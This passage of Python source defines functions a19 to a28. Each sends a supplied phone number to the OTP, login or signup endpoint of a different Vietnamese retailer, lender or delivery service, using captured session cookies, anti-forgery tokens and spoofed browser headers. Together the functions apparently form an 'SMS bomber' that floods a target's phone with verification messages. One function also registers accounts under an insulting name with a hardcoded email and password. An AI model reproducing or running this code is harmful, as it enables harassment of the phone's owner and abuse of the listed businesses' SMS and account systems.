  response = requests.post('https://vamo.vn/ws/api/applications/current/otp', cookies=cookies, headers=headers, json=json_data)
def a19(phone):
  cookies = {
        '_gcl_au': '1.1.1711261509.1692880680',
    '_gid': 'GA1.2.941184295.1692880680',
    '_gat_UA-78703708-2': '1',
    '_ga': 'GA1.1.724131020.1692880680',
    '_ga_P138SCK22P': 'GS1.1.1692880680.1.1.1692880717.23.0.0',
    }
  headers = {
        'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1711261509.1692880680; _gid=GA1.2.941184295.1692880680; _gat_UA-78703708-2=1; _ga=GA1.1.724131020.1692880680; _ga_P138SCK22P=GS1.1.1692880680.1.1.1692880717.23.0.0',
    'Origin': 'https://shopiness.vn',
    'Referer': 'https://shopiness.vn/cau-hoi-thuong-gap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
  data = {
    'action': 'verify-registration-info',
    'phoneNumber': phone,
    'refCode': '',
}

  response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)
def a20(phone):
    cookies = {
        'ck_bhx_us_log': '%7b%22did%22%3a%2271e90187-09d6-4e94-970a-31fcbaa9560d%22%2c%22dtk%22%3a%22%22%2c%22atk%22%3a%22%22%2c%22rtk%22%3a%22%22%2c%22dexp%22%3a0%2c%22dateexp%22%3a%220001-01-01T00%3a00%3a00%22%7d',
    'ASP.NET_SessionId': 'h0mel1sm412frdgj2ukqgj1t',
    'ck_bhx_userstr': 'e84fd825-aff4-47f9-b81f-665193d30ae2',
    '_pk_ref.4.dc5c': '%5B%22%22%2C%22%22%2C1692884013%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.4.dc5c': '0e063b4886bdee23.1692884013.',
    '_pk_ses.4.dc5c': '1',
    'trackSSID': 'c28020103b1b90e1ddebe60cd95cb7cb',
    'lhc_per': 'vid|223d1e3382d378ce2d11',
    '_gcl_au': '1.1.743812259.1692884014',
    '_gid': 'GA1.2.59797266.1692884014',
    '_gat_UA-68702031-1': '1',
    'cebs': '1',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-40%2C14.255.194.150%2C1%2C3357fadb0316939352bbdd4d5360a97f',
    'bhxcid': '2b0dbb86-0195-4ab1-b312-8ff18e3fb4b2',
    '__RequestVerificationToken': 'aEH0PCXF8T4frtxVvW3t9n_9ok6Kv5znaKd4CC7O0YfSm2p23vqRJ2hwgQd-pW5PQ8xrN0Jof7iaoIMLET-YhaN-Pb5AmSHr_KLuqg27Pko1',
    'bhx_vcrif': '{%22Email%22:null%2C%22NameWithGender%22:%22b%E1%BA%A1n%22%2C%22Name%22:null%2C%22Gender%22:-1%2C%22Phone%22:null%2C%22me%22:%22LLw/ckoZPTE=%22}',
    '_ga': 'GA1.1.947057088.1692884014',
    'cebsp_': '2',
    'SvID': 'bhx27245|ZOdcP|ZOdcL',
    '_ga_D7JSZ8W98Z': 'GS1.1.1692884013.1.1.1692884030.43.0.0',
    '_ce.s': 'v~627b865b25f831964a0546d465c785787069876d~lcw~1692884034938~vpv~0~as~false~v11.cs~244146~v11nv~-2~v11.sla~1692884035356~v11.s~d2e0beb0-4282-11ee-b023-b1737740f570~lcw~1692884035356',
    }

    headers = {
        'authority': 'www.bachhoaxanh.com',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'ck_bhx_us_log=%7b%22did%22%3a%2271e90187-09d6-4e94-970a-31fcbaa9560d%22%2c%22dtk%22%3a%22%22%2c%22atk%22%3a%22%22%2c%22rtk%22%3a%22%22%2c%22dexp%22%3a0%2c%22dateexp%22%3a%220001-01-01T00%3a00%3a00%22%7d; ASP.NET_SessionId=h0mel1sm412frdgj2ukqgj1t; ck_bhx_userstr=e84fd825-aff4-47f9-b81f-665193d30ae2; _pk_ref.4.dc5c=%5B%22%22%2C%22%22%2C1692884013%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.4.dc5c=0e063b4886bdee23.1692884013.; _pk_ses.4.dc5c=1; trackSSID=c28020103b1b90e1ddebe60cd95cb7cb; lhc_per=vid|223d1e3382d378ce2d11; _gcl_au=1.1.743812259.1692884014; _gid=GA1.2.59797266.1692884014; _gat_UA-68702031-1=1; cebs=1; _ce.clock_event=1; _ce.clock_data=-40%2C14.255.194.150%2C1%2C3357fadb0316939352bbdd4d5360a97f; bhxcid=2b0dbb86-0195-4ab1-b312-8ff18e3fb4b2; __RequestVerificationToken=aEH0PCXF8T4frtxVvW3t9n_9ok6Kv5znaKd4CC7O0YfSm2p23vqRJ2hwgQd-pW5PQ8xrN0Jof7iaoIMLET-YhaN-Pb5AmSHr_KLuqg27Pko1; bhx_vcrif={%22Email%22:null%2C%22NameWithGender%22:%22b%E1%BA%A1n%22%2C%22Name%22:null%2C%22Gender%22:-1%2C%22Phone%22:null%2C%22me%22:%22LLw/ckoZPTE=%22}; _ga=GA1.1.947057088.1692884014; cebsp_=2; SvID=bhx27245|ZOdcP|ZOdcL; _ga_D7JSZ8W98Z=GS1.1.1692884013.1.1.1692884030.43.0.0; _ce.s=v~627b865b25f831964a0546d465c785787069876d~lcw~1692884034938~vpv~0~as~false~v11.cs~244146~v11nv~-2~v11.sla~1692884035356~v11.s~d2e0beb0-4282-11ee-b023-b1737740f570~lcw~1692884035356',
    'origin': 'https://www.bachhoaxanh.com',
    'referer': 'https://www.bachhoaxanh.com/dang-nhap?callback=%2Flich-su-mua-hang',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
    }

    response = requests.post('https://www.bachhoaxanh.com/aj/Customer/CheckTypeUserLogin', cookies=cookies, headers=headers, data=data)
def a21(phone):
    cookies = {
        '_gcl_au': '1.1.1630003881.1692953630', 
    '_gid': 'GA1.2.1353526530.1692953637', 
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1692953637%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D', 
    '_pk_id.8.8977': 'c67c684063909c00.1692953637.', 
    '_pk_ses.8.8977': '1', 
    '_fbp': 'fb.1.1692953639171.1560671308', 
    '__zi': '2000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuHBJPyyZhgXabb2mJI8z-wJNa34DO_qf91UI8ezY_cZcbb9YJ4.1', 
    'lhc_per': 'vid|23abb87e0b2737810980', 
    'cebs': '1', 
    '_ce.clock_event': '1', 
    '_ce.clock_data': '29104241%2C113.191.13.1%2C1%2C3357fadb0316939352bbdd4d5360a97f', 
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKsOFVzWBgiNFLG0rR-uZeUdTFydUIR_5IXbPZqBc0UamqotzEV8gaQDCnzkmu060_FBisj6t41LHzXKaIyQ0h7XEOdkPymwrQrFCgdqVPhcEvcnLshmeFetRmgNAObagQ', 
    'DMX_Personal': '%7B%22UID%22%3A%2206843595958c33d5a90d4f76f815ef33e3cf6f44%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D', 
    '_gat_UA-38936689-1': '1', 
    'SvID': 'dmxcart2772|ZOf7a|ZOf6b', 
    '_ga_Y7SWKJEHCE': 'GS1.1.1692953637.1.1.1692953878.59.0.0', 
    '_ga': 'GA1.1.195521332.1692953637', 
    'cebsp_': '3', 
    '_ce.s': 'v~1c4fe02b0eb4e79fa33ac12091dafe9a1bf07ab0~lcw~1692953891871~vpv~0~v11.rlc~1692953641555~gtrk.la~llqd1bd7~lcw~1692953892043', 
    }

    headers = {
        'authority': 'www.dienmayxanh.com', 
    'accept': '*/*', 
    'accept-language': 'vi-VN,vi;q=0.9', 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
    # 'cookie': '_gcl_au=1.1.1630003881.1692953630; _gid=GA1.2.1353526530.1692953637; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1692953637%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c67c684063909c00.1692953637.; _pk_ses.8.8977=1; _fbp=fb.1.1692953639171.1560671308; __zi=2000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuHBJPyyZhgXabb2mJI8z-wJNa34DO_qf91UI8ezY_cZcbb9YJ4.1; lhc_per=vid|23abb87e0b2737810980; cebs=1; _ce.clock_event=1; _ce.clock_data=29104241%2C113.191.13.1%2C1%2C3357fadb0316939352bbdd4d5360a97f; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKsOFVzWBgiNFLG0rR-uZeUdTFydUIR_5IXbPZqBc0UamqotzEV8gaQDCnzkmu060_FBisj6t41LHzXKaIyQ0h7XEOdkPymwrQrFCgdqVPhcEvcnLshmeFetRmgNAObagQ; DMX_Personal=%7B%22UID%22%3A%2206843595958c33d5a90d4f76f815ef33e3cf6f44%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; _gat_UA-38936689-1=1; SvID=dmxcart2772|ZOf7a|ZOf6b; _ga_Y7SWKJEHCE=GS1.1.1692953637.1.1.1692953878.59.0.0; _ga=GA1.1.195521332.1692953637; cebsp_=3; _ce.s=v~1c4fe02b0eb4e79fa33ac12091dafe9a1bf07ab0~lcw~1692953891871~vpv~0~v11.rlc~1692953641555~gtrk.la~llqd1bd7~lcw~1692953892043', 
    'origin': 'https://www.dienmayxanh.com', 
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap', 
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', 
    'sec-ch-ua-mobile': '?0', 
    'sec-ch-ua-platform': '"Windows"', 
    'sec-fetch-dest': 'empty', 
    'sec-fetch-mode': 'cors', 
    'sec-fetch-site': 'same-origin', 
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 
    'x-requested-with': 'XMLHttpRequest', 
    }

    data = {
        'phoneNumber': phone,
'isReSend': 'false', 
    'sendOTPType': '1', 
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvLZ1vuUEVpEqVuykCTnBD3FIq23h4qmtcRhl__UsK0ao0qvnaT72vv8HzHhsyzYxvh7CkLslxN7BTx80cNPmo4j_87ezNfQnIkjHrXZklHfzt6lqpbWVpznxbtaCYxRITs', 
    }

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def a22(phone):
    cookies = {
        'ASP.NET_SessionId': '4dly1sj0dt2lbebcit1onblg',
    '__zi': '2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvRNUIb2PSfhajDy1K9vorEsxqW5RdZ8pE0.1',
    'DMX_Personal': '%7B%22UID%22%3A%227e51214271cedac90392e14445d00e3ec0f82951%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvI67V8cTHcdw5eIjWsOK88wtENN6s93kBZz7qWzTwjHipGn6C6EyDpAiCcwYqmsEZ7Zc_U-xnf7JQCO_07Ctr6o3p-_PYlVupf9Fajpq-nbq0-U00KdFz6MRUMtStNhid8',
    '_ga': 'GA1.2.630100784.1692894242',
    '_gid': 'GA1.2.336235521.1692894242',
    'MWG_ORDERHISTORY_SS': 'CfDJ8Btx1b7t0ERJkQbRPSImfvK8Bpoyj6WdCRekrg7z%2FQrHqoX1NXbond%2BicTXwI%2B0ZNkNWBDpjW5%2BL7nV3xSj1mEPDcz4Fv5rqUVuW5voTPfp6n%2FUwYUuDTVgJ9xGFJU0%2Bfxf3Bwe2BEn818KGFHkB9Ssgd43JokvGArSY3sBzqa9r',
    'SvID': 'tgcart243|ZOeEX|ZOeEH',
    }

    headers = {
        'authority': 'www.thegioididong.com',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'ASP.NET_SessionId=4dly1sj0dt2lbebcit1onblg; __zi=2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvRNUIb2PSfhajDy1K9vorEsxqW5RdZ8pE0.1; DMX_Personal=%7B%22UID%22%3A%227e51214271cedac90392e14445d00e3ec0f82951%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvI67V8cTHcdw5eIjWsOK88wtENN6s93kBZz7qWzTwjHipGn6C6EyDpAiCcwYqmsEZ7Zc_U-xnf7JQCO_07Ctr6o3p-_PYlVupf9Fajpq-nbq0-U00KdFz6MRUMtStNhid8; _ga=GA1.2.630100784.1692894242; _gid=GA1.2.336235521.1692894242; MWG_ORDERHISTORY_SS=CfDJ8Btx1b7t0ERJkQbRPSImfvK8Bpoyj6WdCRekrg7z%2FQrHqoX1NXbond%2BicTXwI%2B0ZNkNWBDpjW5%2BL7nV3xSj1mEPDcz4Fv5rqUVuW5voTPfp6n%2FUwYUuDTVgJ9xGFJU0%2Bfxf3Bwe2BEn818KGFHkB9Ssgd43JokvGArSY3sBzqa9r; SvID=tgcart243|ZOeEX|ZOeEH',
    'origin': 'https://www.thegioididong.com',
    'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvLlzwCFK0a9kyF1nVlr8sAeZp9iG0et5S8OqygkA9NxGtLFGW-wSSojydGzCNun0cqTXgAogTvkA4tDKLimDXgDMB95Cr8Vd3Hpdf4Efh07Sqoo3rT-VPgNt5vP2G0HHmk',
    }

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def a23(phone):

    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://best-inc.vn',
    'Referer': 'https://best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'x-auth-type': 'web-app',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
    'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
def a24(phone):

    headers = {
        'authority': 'api-crownx.winmart.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
    'fullName': 'Ngu can em',
    'email': 'Ngocphongngulol@gmail.com',
    'password': 'Ngocphongngulol11AA@',
    }

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data)
def a25(phone):
    cookies = {
        '_ga_nefsid': 'H8xnzW9JNHBFRlRUFBbF2E2FLn1XFoau%2C1692899481090',
    '_ga_neftid': '8PWjIRN2WQ5FRlVAVVPBjU3QO3hHB4Ku',
    '__snaker__id': 'bSRwHRy633G8vrXP',
    'gdxidpyhxdE': 'on0J3%2BPcdg1%5Cmt8bCQlD71onkuplKHvblJV1fS7sTapJXoJ4QOx7aO126A%5CRhyk5ffk2E%2Bi%2FuA%2BY4m5VJiA7sN9%5CpH5PcTbJy77hn03TkC0P7eJllrX1Pr5RoCDM1uujqoIIlgTGhQODzx%2FbMjQqiuGYkQNZdiqaiAtGmhL3UdRuzXe4%3A1692896843119',
    }

    headers = {
        'authority': 'm.ctcrt.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'appcodename': 'Mozilla',
    'appname': 'Netscape',
    'cache-control': 'no-cache',
    'channel': '3841',
    'content-language': 'vn',
    'content-type': 'application/json',
    # 'cookie': '_ga_nefsid=H8xnzW9JNHBFRlRUFBbF2E2FLn1XFoau%2C1692899481090; _ga_neftid=8PWjIRN2WQ5FRlVAVVPBjU3QO3hHB4Ku; __snaker__id=bSRwHRy633G8vrXP; gdxidpyhxdE=on0J3%2BPcdg1%5Cmt8bCQlD71onkuplKHvblJV1fS7sTapJXoJ4QOx7aO126A%5CRhyk5ffk2E%2Bi%2FuA%2BY4m5VJiA7sN9%5CpH5PcTbJy77hn03TkC0P7eJllrX1Pr5RoCDM1uujqoIIlgTGhQODzx%2FbMjQqiuGYkQNZdiqaiAtGmhL3UdRuzXe4%3A1692896843119',
    'devicetype': 'H5',
    'fbc': '',
    'fbp': '',
    'h': '2400.75',
    'network': 'wifi',
    'platform': 'Linux aarch64',
    'platformid': 'android',
    'referer': 'https://m.ctcrt.com/?gclid=Cj0KCQjw_5unBhCMARIsACZyzS10Tgfv-uzPsehl-kYbwypTmSM3jRlIBnj5SAY55yeyYjiF6uHL2IgaAuGnEALw_wcB',
    'screenresolution': '1080.75,2400.75',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'system': 'android',
    't': '1692895955359',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'useragent': 'dcec50e04485a6cc0f517225d948331a',
    'vendor': 'Google Inc.',
    'w': '1080.75',
    }

    params = {
        'phone': phone,
    'type': '1',
    'validate': 'CN31_CZCOnAqSCZP88ZXkZEq5I1vlUaJhlQ0WD2Q5BRTWZFJAxELDW08adCV_7VjyKgnghLg2wws9OLzfn9daYtheqnC4_GFHsSZEQrLmu-eW0kzmGRC8RCT6UDPSvJOBJZ9BVy6hBnUy-HGD09V-RLC5RtwdQ2w2Ar5D9d089DA8bEgLCJU79FQ9b752SMppOtlxzlVJpz2MykOJwcX-l1SwcLy6s-hiTJNadBfyN1WHysNaNgdJJv0jKsa.0bjtKt1mIYjhWATWrj.CnDqPudCMUPbUXrRP180_2MImwQH6-IUywPCtiVftVeTi-1fF-Z_ZfUdEUaYWn884k.95rwfHlEzAO5QeqhRiZfZXfv879F7FmJnrOVl9g06G7toBDJqbwccR8aaNHTD--4dhx0iyj9ibCKKKp7kMBMYO0_Zc4pgj5dqUaOsdnL2llDFnWBwLQqlMQQGuHvLDDoiR74aBpzoo-OHu-mLRZWOk5OYlCejTttvRBSdpHkBso2c3',
    }

    response = requests.get('https://m.ctcrt.com/api/sms/send', params=params, cookies=cookies, headers=headers)
def a26(phone):
    headers = {
        'authority': 'api.kimungvay.co',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.kimungvay.site',
    'referer': 'https://h5.kimungvay.site/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'type': '2',
    'ctype': '1',
    'chntoken': '06f2a0c7bf010dad0fd29866aed001f5',
    }

    response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data)
def a27(phone):
  cookies = {
        'CaptchaCookieKey': '0',
    'language': 'vi',
    'UserTypeMarketing': 'L0',
    '_ga': 'GA1.2.476355071.1692726393',
    '__sbref': 'iriftdmsqfoqqwdgssrhwqywrwhtrxfpspxtntvr',
    'Marker': 'MarkerInfo=GflMJlMkTxBiS88SYqR6zKWIhE65y6Prxm0XkoqUENI=',
    'ASP.NET_SessionId': 'rq42nsumknegqivy32enilho',
    'RequestData': 'e37e59f3-6cbc-4028-a386-3ea0cc049ba8',
    'LeadPartner31B92E50BCF7EFC6A1': 'lgid=6&lpid=utm_medium%3daffiliate%26utm_campaign%3dgoodaff%26utm_term%3d2%26click_id%3d5f9fa80d1de64f1337f49adeffa11d62',
    'ET31B92E50BCF7EFC6A1': '-8585060863055710457',
    '_gid': 'GA1.2.1532626262.1692928587',
    'UserMachineId_png': 'a494e24c-2281-4894-9883-8aa9611b5862',
    'UserMachineId_etag': 'a494e24c-2281-4894-9883-8aa9611b5862',
    'UserMachineId_cache': 'a494e24c-2281-4894-9883-8aa9611b5862',
    'UserMachineId': 'a494e24c-2281-4894-9883-8aa9611b5862',
    }
  headers = {
        'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; _ga=GA1.2.476355071.1692726393; __sbref=iriftdmsqfoqqwdgssrhwqywrwhtrxfpspxtntvr; Marker=MarkerInfo=GflMJlMkTxBiS88SYqR6zKWIhE65y6Prxm0XkoqUENI=; ASP.NET_SessionId=rq42nsumknegqivy32enilho; RequestData=e37e59f3-6cbc-4028-a386-3ea0cc049ba8; LeadPartner31B92E50BCF7EFC6A1=lgid=6&lpid=utm_medium%3daffiliate%26utm_campaign%3dgoodaff%26utm_term%3d2%26click_id%3d5f9fa80d1de64f1337f49adeffa11d62; ET31B92E50BCF7EFC6A1=-8585060863055710457; _gid=GA1.2.1532626262.1692928587; UserMachineId_png=a494e24c-2281-4894-9883-8aa9611b5862; UserMachineId_etag=a494e24c-2281-4894-9883-8aa9611b5862; UserMachineId_cache=a494e24c-2281-4894-9883-8aa9611b5862; UserMachineId=a494e24c-2281-4894-9883-8aa9611b5862',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c5d6e78d2e5853ee3fe947f7d63ad4f9-1b7c901848570337-00',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
  data = {
    'phoneNumber': phone,
}

  response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)
def a28(phone):
  headers = {
        'authority': 'api.onelife.vn',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'content-type': 'application/json',
    'origin': 'https://kingfoodmart.com',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
  json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}

  response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
